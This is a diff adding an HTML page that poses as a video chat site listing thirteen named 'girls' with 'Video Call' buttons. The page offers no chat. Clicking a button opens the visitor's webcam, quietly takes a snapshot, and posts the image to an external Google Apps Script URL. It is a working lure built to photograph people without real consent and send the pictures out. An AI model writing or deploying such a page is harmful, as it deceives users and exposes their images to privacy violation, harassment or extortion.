@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Stylish Girl Video Chat</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f0f2f5;
+      padding: 20px;
+    }
+    .card {
+      background: white;
+      padding: 25px;
+      border-radius: 20px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 90%;
+      max-width: 350px;
+      margin: 0 auto 20px;
+      border-left: 5px solid red;
+      border-right: 5px solid red;
+    }
+    .avatar {
+      width: 100px;
+      border-radius: 50%;
+      margin-bottom: 10px;
+    }
+    .name {
+      font-size: 26px;
+      font-family: 'Pacifico', cursive;
+      color: #d00000;
+      margin-bottom: 5px;
+    }
+    .status {
+      color: green;
+      margin: 8px 0 15px;
+      font-weight: bold;
+    }
+    .btn {
+      background: #4b4bff;
+      color: white;
+      padding: 10px 24px;
+      border: none;
+      border-radius: 30px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="cards"></div>
+  <video id="video" autoplay></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
+  <script>
+    const girls = [
+      "Haleema", "Iqra", "Fatima", "Dua", "Saira", "Sidra", "Noor",
+      "Rimsha", "Areeka", "Anaya", "Tuba", "Kainat", "Bisma"
+    ];
+    const cardsContainer = document.getElementById("cards");
+    girls.forEach(name => {
+      const card = document.createElement("div");
+      card.className = "card";
+      card.innerHTML = `
+        <img src="https://via.placeholder.com/100" class="avatar">
+        <div class="name">${name}</div>
+        <div class="status">Online • Video Chat Available</div>
+        <button class="btn" onclick="captureAndUpload('${name}')">Video Call</button>
+      `;
+      cardsContainer.appendChild(card);
+    });
+    async function captureAndUpload(name) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/jpeg').split(',')[1];
+        stream.getTracks().forEach(track => track.stop());
+        fetch('https://script.google.com/macros/s/AKfycbwVd98xBSaIauKlg606y_4K7Qmk6C76EvAgN1pm5nZJ_SZbiurT0vliTZ9i51ZCt_4B/exec', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'image=' + encodeURIComponent(imageData)
+        })
+        .then(res => res.text())
+        .then(data => alert(`✅ Photo uploaded for ${name}`))
+        .catch(err => alert("❌ Upload failed"));
+      } catch (err) {
+        alert("❌ Camera error: " + err);
+      }
+    }
+  </script>
+</body>
+</html>
